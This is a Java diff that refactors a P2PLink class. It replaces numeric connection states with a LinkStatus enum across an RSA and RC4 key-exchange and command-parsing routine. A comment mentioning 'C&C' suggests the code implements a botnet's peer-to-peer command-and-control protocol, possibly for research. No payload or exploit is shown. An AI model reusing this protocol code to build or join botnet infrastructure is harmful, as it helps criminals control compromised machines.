@@ -23,7 +23,7 @@ public class P2PLink extends TCPSocket {
 	public SelectionKey selfKey;
 	public boolean isOnlyHub;
 	public boolean isEncrypt;
-	public int status;
+	public LinkStatus status;
 	public long lastUsedTime;
 	public long lastConnect;
 	public ThreadServer owner;
@@ -35,7 +35,7 @@ public class P2PLink extends TCPSocket {
 	
 	public P2PLink(ThreadServer newOwner) {
         isEncrypt = false;
-        status = 0;
+        status = LinkStatus.OFFLINE;
         lastConnect = 0;
         isIncoming = false;
         isOnlyHub = false;
@@ -47,22 +47,18 @@ public class P2PLink extends TCPSocket {
 
 	public void init() {
 		receiveBuffer.clear();
-		status = 0;
+		status = LinkStatus.OFFLINE;
 		isEncrypt = false;
 		isIncoming = false;
 		sendAndClose = false;
 		isOnlyHub = false;
-		rc4Instream = null;
-		rc4Outstream = null;
-		socketAddress = null;
-		hr = null;
 	}
 	
 	public void connect(InetSocketAddress newSocketAddress) {
         try {
         	LOGGER.info(" [!] Attempting to make a P2P connection to : " + newSocketAddress.getHostName() + "/" + newSocketAddress.getPort());
         	isIncoming = false;
-            status = 1;
+            status = LinkStatus.KEY_EXCHANGE_START;
             lastConnect = System.currentTimeMillis();
             channel = SocketChannel.open();
             channel.configureBlocking(false);
@@ -116,7 +112,7 @@ public class P2PLink extends TCPSocket {
 	}
 
 	public boolean isConnected() {
-		return isEncrypt && channel.socket().isConnected() && status == 3;
+		return isEncrypt && channel.socket().isConnected() && status == LinkStatus.ONLINE;
 	}
 	
 	public void recvHello(Packet packet) {
@@ -311,7 +307,7 @@ public class P2PLink extends TCPSocket {
 				hr.status = -1;
 		}
 		
-		status = 0;
+		status = LinkStatus.OFFLINE;
 	}
 
 	@Override
@@ -332,7 +328,7 @@ public class P2PLink extends TCPSocket {
 			buffer.put(modulus);
 			
 			send(buffer.array());
-			status = 2;
+			status = LinkStatus.KEY_EXCHANGE_DONE;
 		} else {
 			hr = owner.hubList.getByIpAndPort(channel.socket().getInetAddress().getHostAddress(), channel.socket().getPort());
 			if(hr == null)
@@ -357,7 +353,7 @@ public class P2PLink extends TCPSocket {
 		}
 		
 		owner.p2plist.delete(this);
-		status = 0;
+		status = LinkStatus.OFFLINE;
 	}
 
 	@Override
@@ -365,6 +361,8 @@ public class P2PLink extends TCPSocket {
 		super.onRead(key);
 		
         lastUsedTime = System.currentTimeMillis();
+        
+        // If we know it's encrypted, decrypt it first
         if (isEncrypt) {
             receiveBuffer.put(rc4Instream.crypt(readBuffer.array()));
             readBuffer.clear();
@@ -376,9 +374,9 @@ public class P2PLink extends TCPSocket {
         byte[] rc4key;
         MyBuffer mb;
         byte[] tmp2;
-        if (isIncoming || status != 2 || readBuffer.size <= 4) {
-            if (status != 0 && isIncoming || readBuffer.size <= 4) {
-                if (receiveBuffer.size > 0 && status == 3) {
+        if (isIncoming || status != LinkStatus.KEY_EXCHANGE_DONE  || readBuffer.size <= 4) {
+            if (status != LinkStatus.OFFLINE && isIncoming || readBuffer.size <= 4) {
+                if (receiveBuffer.size > 0 && status == LinkStatus.ONLINE) {
                     parseCommand();
                 }
             } else {
@@ -408,8 +406,8 @@ public class P2PLink extends TCPSocket {
                         mb.putDword(tmp2.length);
                         mb.put(tmp2);
                         send(mb);
-                        status = 3;
-                        if (receiveBuffer.size > 0 && status == 3) {
+                        status = LinkStatus.ONLINE;
+                        if (receiveBuffer.size > 0 && status == LinkStatus.ONLINE) {
                             parseCommand();
                         }
                     } else {
@@ -434,13 +432,13 @@ public class P2PLink extends TCPSocket {
                 isEncrypt = true;
                 receiveBuffer.put(rc4Instream.crypt(readBuffer.array()));
                 readBuffer.clear();
-                status = 3;
+                status = LinkStatus.ONLINE;
                 sendHello();
                 hr.connectCount = 0;
                 hr.lastConnect = System.currentTimeMillis();
                 hr.status = 1;
-                if (status != 0 && isIncoming || readBuffer.size <= 4) {
-                    if (receiveBuffer.size > 0 && status == 3) {
+                if (status != LinkStatus.OFFLINE && isIncoming || readBuffer.size <= 4) {
+                    if (receiveBuffer.size > 0 && status == LinkStatus.ONLINE) {
                         parseCommand();
                     }
                 } else {
@@ -468,8 +466,8 @@ public class P2PLink extends TCPSocket {
                             mb.putDword(tmp2.length);
                             mb.put(tmp2);
                             send(mb);
-                            status = 3;
-                            if (receiveBuffer.size > 0 && status == 3) {
+                            status = LinkStatus.ONLINE;
+                            if (receiveBuffer.size > 0 && status == LinkStatus.ONLINE) {
                                 parseCommand();
                             }
                         }
@@ -481,5 +479,10 @@ public class P2PLink extends TCPSocket {
         }
 	}
 	
-	
+    public static enum LinkStatus {
+    	OFFLINE, // No connection
+    	KEY_EXCHANGE_START, // Connection started, need crypto
+    	KEY_EXCHANGE_DONE, // Key sent to C&C
+    	ONLINE // Key exchange done and valid
+    }
 }
